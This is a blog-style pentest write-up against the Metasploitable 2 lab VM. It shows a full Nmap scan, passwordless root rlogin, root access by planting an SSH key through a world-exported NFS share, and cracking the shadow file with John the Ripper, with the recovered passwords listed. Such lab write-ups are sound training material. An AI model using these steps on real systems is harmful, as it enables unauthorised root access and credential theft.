---
layout: post
title:  "The Pentest Runbook Part 2 "
date:   2020-06-29 09:19:32 +0200
categories: alecsahew github.io Pentest Runbook
---

### Task and Environemnt 

* Pen Testing for Metasploitable 2 

### Used Tool 
* kali-linux 2020
* Nmap 
* John the Ripper

### Reconessaince & Exploitation  
* Scan all ports + service version + detect OS + banner grab
* nmap -v -oA recon.metasploitable 192.168.178.50 -sS -sV -O -p1-65535 --script banner
 
* Scan for weak password
* John the Ripper

### Report 
* 1) MISCOFIGURATION: It is possible to get access to the system 
* 2) WEAK PASSWORD for both system and database server accounts

#### 1. List Of The Open Ports 

	Nmap -sV -O -p1-65535 192.168.178.50
	Nmap scan report for 192.168.178.50
	Host is up (0.0055s latency).
	Not shown: 65505 closed ports
	PORT      STATE SERVICE     VERSION
	21/tcp    open  ftp         vsftpd 2.3.4
	22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	23/tcp    open  telnet      Linux telnetd
	25/tcp    open  smtp        Postfix smtpd
	53/tcp    open  domain      ISC BIND 9.4.2
	80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	111/tcp   open  rpcbind     2 (RPC #100000)
	139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	512/tcp   open  exec?
	513/tcp   open  login?
	514/tcp   open  tcpwrapped
	1099/tcp  open  rmiregistry GNU Classpath grmiregistry
	1524/tcp  open  shell       Metasploitable root shell
	2049/tcp  open  nfs         2-4 (RPC #100003)
	2121/tcp  open  ftp         ProFTPD 1.3.1
	3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
	3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
	5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
	5900/tcp  open  vnc         VNC (protocol 3.3)
	6000/tcp  open  X11         (access denied)
	6667/tcp  open  irc         Unreal ircd
	6697/tcp  open  irc         Unreal ircd
	8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
	8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
	8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
	38869/tcp open  status      1 (RPC #100024)
	46013/tcp open  nlockmgr    1-4 (RPC #100021)
	49058/tcp open  mountd      1-3 (RPC #100005)
	53312/tcp open  unknown
	MAC Address: C4:85:08:25:DD:16 (Intel Corporate)
	Device type: general purpose
	Running: Linux 2.6.X
	OS CPE: cpe:/o:linux:linux_kernel:2.6
	OS details: Linux 2.6.9 - 2.6.33
	Uptime guess: 0.932 days (since Tue Jun 23 15:09:55 2020)
	Network Distance: 1 hop
	TCP Sequence Prediction: Difficulty=204 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	

#### 1.1 513/tcp Analysis of Remote Login 
#### Remote Login Exploitation

##### 513/tcp: rlogin possible without password 

	[~]$ rlogin -l root 192.168.178.50
	Last login: Tue Jun 23 08:49:00 EDT 2020 from :0.0 on pts/0
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.

	To access official Ubuntu documentation, please visit:
	http://help.ubuntu.com/
	You have new mail.
	root@metasploitable:~#
	
#### 1.2 2049/tcp Analysis of NFS (Network File System)
#### Privilege Escalation via NFS

##### 2049/tcp open  nfs: "/" the root of the file system is being exported
##### in this case a ssh key can be created and can be added to the ssh key of the victim machine for the root user

	[~]$ rpcinfo -p 192.168.178.50
		program vers proto   port  service
		100000    2   tcp    111  portmapper
		100000    2   udp    111  portmapper
		100024    1   udp  53667  status
		100024    1   tcp  38869  status
		100003    2   udp   2049  nfs
		100003    3   udp   2049  nfs
		100003    4   udp   2049  nfs
		100021    1   udp  54528  nlockmgr
		100021    3   udp  54528  nlockmgr
		100021    4   udp  54528  nlockmgr
		100003    2   tcp   2049  nfs
		100003    3   tcp   2049  nfs
		100003    4   tcp   2049  nfs
		100021    1   tcp  46013  nlockmgr
		100021    3   tcp  46013  nlockmgr
		100021    4   tcp  46013  nlockmgr
		100005    1   udp  54216  mountd
		100005    1   tcp  49058  mountd
		100005    2   udp  54216  mountd
		100005    2   tcp  49058  mountd
		100005    3   udp  54216  mountd
		100005    3   tcp  49058  mountd

	[ ~]$ showmount -e 192.168.178.50
	Export list for 192.168.178.50:
	/ *

##### with these prerequisites 
##### 1) a new SSH key can be generate on the attacking system
##### 2) the NFS export can be mounted 
##### 3) the key can added to the root user
##### 4) that leads to full access to the server via ssh 

	[ssh]# ssh-keygen
	Generating public/private rsa key pair.
	Enter file in which to save the key (/root/.ssh/id_rsa): 
	Enter passphrase (empty for no passphrase): 
	Enter same passphrase again: 
	Your identification has been saved in /root/.ssh/id_rsa.
	Your public key has been saved in /root/.ssh/id_rsa.pub.
	...
	[.ssh]# ll
	total 12
	-rw-------. 1 root root 1675 Jun 24 12:03 id_rsa
	-rw-r--r--. 1 root root  403 Jun 24 12:03 id_rsa.pub

	[ tmp]$ mkdir m000
	[.ssh]# mount -t nfs 192.168.178.50:/ /tmp/m000/
	[.ssh]# cat id_rsa.pub >> /tmp/m000/root/.ssh/authorized_keys
	[.ssh]# umount /tmp/m000

	[ ~]# ssh root@192.168.178.50 
	Last login: Wed Jun 24 04:24:48 2020 from x69x69.fritz.box
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.

	To access official Ubuntu documentation, please visit:
	http://help.ubuntu.com/
	You have new mail.
	root@metasploitable:~# 
	

#### 2. Analysis of PASSWORDs
#### Weak Passwords

	unshadow /tmp/m000/etc/passwd /tmp/m000/etc/shadow > merge.txt
 	john merge.txt
 	john --show merge.txt
 	sys:batmann
 	klog:123456789
 	service:service
 	user:user
 	postgres:postgres
 	msfadminr:sfadmin
 
	the root mysql password is empty 

to be continued ...	
